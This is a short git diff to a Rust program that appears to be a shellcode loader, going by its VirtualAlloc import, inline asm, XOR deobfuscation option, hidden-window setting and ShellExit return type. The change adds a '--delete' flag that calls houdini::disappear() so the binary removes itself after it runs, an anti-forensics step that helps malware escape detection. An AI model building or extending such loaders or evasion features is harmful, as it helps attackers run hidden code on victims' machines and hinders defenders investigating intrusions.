@@ -1,5 +1,6 @@
 use std::arch::asm;
 use std::process::Termination;
+use houdini;
 
 // #![windows_subsystem = "windows"]
 use bindings::windows::win32::system_services::VirtualAlloc;
@@ -56,8 +57,21 @@ fn main() -> ShellExit {
                 .about("deobfuscate with XOR encoding")
                 .takes_value(true),
         )
+        .arg(
+            Arg::new("delete")
+                .short('d')
+                .long("delete")
+                .about("delete itself")
+        )
         .get_matches();
 
+    let delete = matches.is_present("delete");
+    if delete{
+        match houdini::disappear() {
+            Ok(_) => {},
+            Err(e) => eprintln!("[-] Could not self delete {}", e),
+        };
+    }
     let set_breakpoint = matches.is_present("breakpoint");
     if set_breakpoint {
         println!("[*] Breakpoint flag set!");
